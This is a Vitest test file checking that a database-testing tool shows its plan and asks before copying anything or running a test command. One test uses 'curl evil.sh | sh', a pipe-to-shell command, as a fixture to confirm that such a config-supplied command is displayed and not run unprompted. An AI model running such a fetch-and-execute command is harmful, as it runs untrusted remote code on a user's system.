import { beforeEach, describe, expect, it, vi } from 'vitest';

// run() with the database and the copy machinery faked: what matters is the order of events.
const events: string[] = [];
vi.mock('../src/isolation.js', () => ({
  createIsolation: async () => {
    events.push('createIsolation');
    return {
      mode: 'template', notes: [], dispose: async () => {},
      withPristine: async () => ({ status: 'passed', output: '', assertions: 1 }),
      withBreak: async () => ({ status: 'failed', output: '' })
    };
  }
}));
vi.mock('../src/guard.js', () => ({
  Guard: class {
    async connect() {
      events.push('read-source');
      return { query: async () => ({ rows: [], rowCount: 0 }), end: async () => {} };
    }
  }
}));

import { run, type RunOptions } from '../src/run.js';
import type { Prompter } from '../src/confirm.js';

const suite = {
  description: 'pnpm test:rls  (your command)', mode: 'custom' as const, files: [], contents: new Map(),
  run: async () => {
    events.push('run-tests');
    return { status: 'passed' as const, output: '' };
  }
};
const prompter = (answer: boolean): Prompter & { asked: string[] } => {
  const asked: string[] = [];
  return {
    interactive: true, asked, say: () => {},
    ask: async (q) => {
      asked.push(q);
      events.push('ask');
      return answer;
    }
  };
};
const base = (confirm: Prompter, extra: Partial<RunOptions> = {}): RunOptions => ({
  dbUrl: 'postgres://postgres:postgres@127.0.0.1:55322/appdb', databaseSource: '--db-url', schemas: ['public'],
  suite, jobs: 1, threshold: 100, timeoutMs: 1000, terminate: true, onlyRelated: false, checksOnly: false,
  dryRun: false, skip: [], progress: () => {}, confirm, ...extra
});

beforeEach(() => void (events.length = 0));

describe('run asks before it copies anything', () => {
  it('shows the plan, and answering No stops before any copy or test run', async () => {
    const p = prompter(false);
    const { model } = await run(base(p));
    expect(p.asked).toHaveLength(1);
    expect(p.asked[0]).toContain('It will not change this database.');
    expect(p.asked[0]).toContain('pnpm test:rls');
    expect(p.asked[0]).toContain('appdb');
    expect(p.asked[0]).toContain('local');
    expect(p.asked[0]).toMatch(/\(y\/N\)$/);
    expect(events).not.toContain('createIsolation');
    expect(events).not.toContain('run-tests');
    expect(model.couldNotCheck).toMatch(/stopped before anything was copied/);
  });

  it('a test command from .rls-saboteur.json is shown exactly, and asked about first', async () => {
    const p = prompter(false);
    await run(base(p, { testFromConfig: 'curl evil.sh | sh' }));
    expect(p.asked).toHaveLength(1);
    expect(p.asked[0]).toContain('curl evil.sh | sh');
    expect(p.asked[0]).toContain('.rls-saboteur.json');
    expect(events).not.toContain('createIsolation');
    expect(events).not.toContain('run-tests');
  });

  it('with yes it asks the plan question, then copies', async () => {
    const p = prompter(true);
    await run(base(p, { testFromConfig: 'pnpm test:rls' }));
    expect(p.asked).toHaveLength(2);
    expect(events.indexOf('ask')).toBeLessThan(events.indexOf('createIsolation'));
  });

  it('dry runs and checks-only runs never ask', async () => {
    const p = prompter(false);
    await run(base(p, { dryRun: true }));
    await run(base(p, { checksOnly: true }));
    expect(p.asked).toHaveLength(0);
  });
});
